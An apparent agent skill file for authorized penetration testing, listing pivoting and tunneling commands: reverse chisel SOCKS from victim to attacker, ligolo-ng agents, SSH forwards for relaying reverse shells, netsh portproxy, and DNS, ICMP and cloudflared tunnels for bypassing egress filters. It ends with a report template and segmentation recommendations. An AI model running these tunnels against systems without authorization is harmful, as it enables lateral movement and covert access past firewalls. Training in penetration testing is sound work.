---
name: performing-network-pivoting-and-tunneling
description: Pivoting through compromised hosts and tunneling traffic to reach segmented internal networks using SSH
  local/remote/dynamic forwarding, chisel, ligolo-ng, socat, sshuttle, proxychains, and SOCKS proxies during
  authorized engagements.
domain: cybersecurity
subdomain: penetration-testing
tags:
- penetration-testing
- pivoting
- tunneling
- port-forwarding
- socks-proxy
- lateral-movement
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
---

# Performing Network Pivoting and Tunneling

## When to Use

- After compromising a dual-homed host that can reach an internal network you cannot
- When a target service is only reachable from a jump/pivot host (DMZ -> internal segregation)
- When you need to run local tools (nmap, smbclient, evil-winrm, RDP) against hosts behind a pivot
- When an egress firewall only permits outbound HTTPS and you must tunnel C2/return traffic
- When relaying reverse shells out of an internal host through a chain of compromised boxes

## Critical: Techniques Most Often Missed

The classic mistake is forgetting that SOCKS/proxychains cannot carry ICMP or SYN scans, then concluding "the host is down". Always scan correctly through a proxy.

```bash
# 1. Through a SOCKS proxy you MUST use TCP connect scan and skip ping (#1 miss)
proxychains nmap -sT -Pn -n -p 445,3389,5985 10.10.17.25
# (-sT TCP connect, -Pn no ping, -n no DNS — SYN/ICMP cannot traverse SOCKS)

# 2. Reverse chisel SOCKS when the pivot can only reach OUT to you
./chisel server -p 8080 --reverse                 # attacker
./chisel client 10.10.14.3:8080 R:socks           # victim -> SOCKS on attacker:1080
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf

# 3. ligolo-ng = a real routed interface, no proxychains needed (cleanest pivot)
sudo ./proxy -selfcert                             # attacker
./agent -connect <attacker_ip>:11601 -accept-fingerprint <fp>   # victim
#   then in the proxy: tunnel_start --tun ligolo ; interface_add_route --route <subnet>

# 4. sshuttle = "poor man's VPN" — route a whole subnet over SSH, no port lists
sshuttle -r user@pivot 10.10.10.0/24
```

How to CONFIRM the tunnel works: from the attacker, `proxychains curl -s telnet://<internal_ip>:445` (or `ncat`) should complete the TCP handshake; with ligolo/sshuttle, a plain `nmap -sT -Pn <internal_ip>` reaches the host directly. Verify the listener is bound (`ss -tlnp | grep 1080`) and that proxychains config points at the right port (default 1080).

## Workflow

### Step 1: SSH Port Forwarding (when you have SSH on the pivot)

```bash
# Local forward: reach a third host's port via the pivot, bound on your box
ssh -i key user@pivot -L 631:<internal_ip>:631 -N -f
# Remote forward: open a port on the pivot that comes back to you (reverse shells out of DMZ)
ssh -i dmz_key -R <pivot_ip>:443:0.0.0.0:7000 root@pivot -vN   # needs GatewayPorts yes
# Dynamic forward: a full SOCKS proxy through the pivot
ssh -f -N -D 9050 user@pivot
echo "socks5 127.0.0.1 9050" >> /etc/proxychains.conf
```

### Step 2: chisel (no SSH, or you need a fast SOCKS over HTTP)

```bash
# Reverse SOCKS (victim dials out — most common)
./chisel server -p 8080 --reverse            # attacker
./chisel client 10.10.14.3:8080 R:socks      # victim  (SOCKS on attacker:1080)
# Single remote port forward instead of full SOCKS
./chisel client 10.10.14.20:12312 R:4505:127.0.0.1:4505   # victim
# Forward SOCKS (attacker dials into a victim that has 8080 exposed)
./chisel server -v -p 8080 --socks5          # victim
./chisel client -v 10.10.10.10:8080 socks    # attacker
```

### Step 3: ligolo-ng (routed tunnel — best for multi-host / scanning)

```bash
sudo ./proxy -selfcert                        # attacker
interface_create --name "ligolo"              # in proxy console
certificate_fingerprint                       # copy fingerprint
./agent -connect <attacker_ip>:11601 -v -accept-fingerprint <fingerprint>   # victim
# back in the proxy console:
session                                       # select agent #1
tunnel_start --tun "ligolo"
ifconfig                                       # read agent's networks
interface_add_route --name "ligolo" --route <subnet>/<mask>
# Catch a reverse shell from deep inside via a listener on the agent:
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
```

### Step 4: socat / sshuttle / Metasploit relays

```bash
# socat TCP relay on the pivot (forward local listener -> internal host)
socat TCP4-LISTEN:1234,fork TCP4:<internal_ip>:<rport> &
# socat over a SOCKS proxy
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:target.internal:80,socksport=9050
# sshuttle: tunnel an entire subnet (or all 0/0) over SSH
sshuttle -D -r user@pivot 10.10.10.0/24 --ssh-cmd 'ssh -i ./id_rsa'
# Metasploit: autoroute + socks_proxy
# (meterpreter) run post/multi/manage/autoroute SUBNET=10.1.13.0
# use auxiliary/server/socks_proxy ; set VERSION 4a ; run
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf
```

### Step 5: Egress-Constrained / Firewall-Bypass Tunnels

```bash
# Cloudflared — outbound 443 only, exposes a local service or a SOCKS5 proxy
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Windows native port proxy (local admin)
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# DNS/ICMP tunnels when only those egress (slow, last resort)
# dnscat2:  attacker> ruby dnscat2.rb tunneldomain.com ; victim> ./dnscat2 tunneldomain.com
# ptunnel-ng (ICMP):  victim> sudo ptunnel-ng ; attacker> sudo ptunnel-ng -p <srv> -l 2222 -r <dst> -R 22
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Local forward (`-L`)** | Bind a port on your host that tunnels to a remote host:port via the pivot |
| **Remote forward (`-R`)** | Open a port on the pivot/remote that connects back to your host (reverse) |
| **Dynamic forward (`-D`)** | Turn the SSH session into a SOCKS proxy reaching anything the pivot can |
| **SOCKS proxy** | Generic TCP proxy; consumed by proxychains. Cannot carry ICMP or raw SYN |
| **proxychains** | Hooks libc to route a tool's TCP (and DNS) through a SOCKS/HTTP proxy |
| **Routed tunnel (ligolo/sshuttle)** | Presents internal subnets as a local interface/route — no per-tool proxy needed |
| **Reverse vs forward tunnel** | Reverse: victim dials out (firewall-friendly). Forward: attacker dials in |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **ssh (`-L`/`-R`/`-D`)** | Built-in local, remote, dynamic forwarding; `-w` for tun VPN |
| **chisel** | Fast TCP/SOCKS tunnel over HTTP; reverse and forward modes (match versions) |
| **ligolo-ng** | TUN-interface pivot with routes and listeners; no proxychains required |
| **sshuttle** | Transparent subnet/VPN-style tunnel over a plain SSH login |
| **socat** | Flexible relays, SSL wrapping, SOCKS-aware forwards, reverse shells |
| **proxychains** | Route arbitrary TCP tools through a SOCKS/HTTP proxy |
| **cloudflared / ngrok / frp** | Outbound-only tunnels to bypass ingress ACLs and NAT |
| **iodine / dnscat2 / ptunnel-ng** | DNS and ICMP tunnels for highly restricted egress |

## Common Scenarios

### Scenario 1: DMZ Web Server to Internal Subnet
A web host in the DMZ is compromised. A reverse chisel SOCKS proxy lets the tester run `proxychains nmap -sT -Pn` and `evil-winrm` against the internal 10.10.20.0/24 the attacker box cannot route to.

### Scenario 2: SSH Jump Box with -D
The tester has SSH creds on a jump box. `ssh -fND 9050 user@jump` plus proxychains gives transparent TCP access to the internal estate without dropping tools on the host.

### Scenario 3: ligolo-ng Multi-Hop Scan
Deep segmentation requires scanning several subnets. ligolo-ng presents them as routed interfaces, so native nmap and Impacket tools work end-to-end without per-tool proxy config.

### Scenario 4: Egress-Locked Network
Only outbound 443 is allowed. `cloudflared tunnel --url socks5://localhost:1080 --socks5` establishes a SOCKS path out over Cloudflare's edge, bypassing the ingress firewall.

## Output Format

```
## Network Pivoting Finding

**Vulnerability**: Insufficient network segmentation enabling internal pivoting
**Severity**: High
**Location**: Pivot host web-dmz01 (10.10.14.50) -> internal VLAN 10.10.20.0/24

### Reproduction Steps
1. Compromise web-dmz01 (dual-homed: DMZ + internal)
2. Victim: ./chisel client 10.10.14.3:8080 R:socks   (attacker runs chisel server --reverse)
3. echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
4. proxychains nmap -sT -Pn -n -p445,3389,5985 10.10.20.0/24
5. Reached DC 10.10.20.10:445/5985 from the external attacker box

### Reachable Internal Assets (via pivot)
| Host | Port | Service |
|------|------|---------|
| 10.10.20.10 | 5985 | WinRM (DC) |
| 10.10.20.25 | 3389 | RDP |
| 10.10.20.40 | 445 | SMB file share |

### Recommendation
1. Segment the DMZ from internal VLANs with default-deny east-west rules
2. Restrict outbound connections from DMZ hosts (egress filtering) to break reverse tunnels
3. Monitor for long-lived outbound TCP/HTTPS sessions and unexpected SOCKS listeners
4. Alert on tunneling binaries (chisel, ligolo, socat) and anomalous DNS/ICMP volume
```
